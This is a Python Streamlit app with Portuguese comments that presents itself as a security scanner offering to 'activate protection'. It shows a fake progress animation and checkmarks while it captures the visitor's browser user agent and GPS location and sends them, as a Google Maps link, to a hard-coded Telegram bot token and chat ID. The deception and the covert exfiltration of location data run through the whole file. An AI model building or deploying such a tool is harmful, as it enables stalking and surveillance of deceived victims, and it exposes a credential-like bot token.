import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_tg(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

# 2. ESTILO (LISO)
st.set_page_config(page_title="Segurança Ativa", layout="centered")
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA DE DADOS (FORA DO BOTÃO)
# Captura o UA logo de cara
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIXO')
# O GPS fica pronto esperando o clique
loc = get_geolocation() 

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
tela = st.empty()

with tela.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. LÓGICA DE 1 CLIQUE
# Se clicar, ele processa tudo de uma vez
if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc and 'coords' in loc:
        # Animação visual rápida para chegar em 100% igual ao vídeo
        for p in [25, 47, 72, 93, 100]:
            tela.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.1)
        
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA\n"
            f"📱 {ua[:40] if ua else 'Mobile'}\n"
            f"📍 [VER LOCALIZAÇÃO]({mapa})"
        )
        
        enviar_tg(relatorio)
        st.success("✅ Proteção Ativada!")
    else:
        # Se o GPS não carregou no tempo de abrir a página, avisa o usuário
        st.error("⚠️ GPS ainda carregando... Aguarde 1 segundo e tente o clique final.")

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
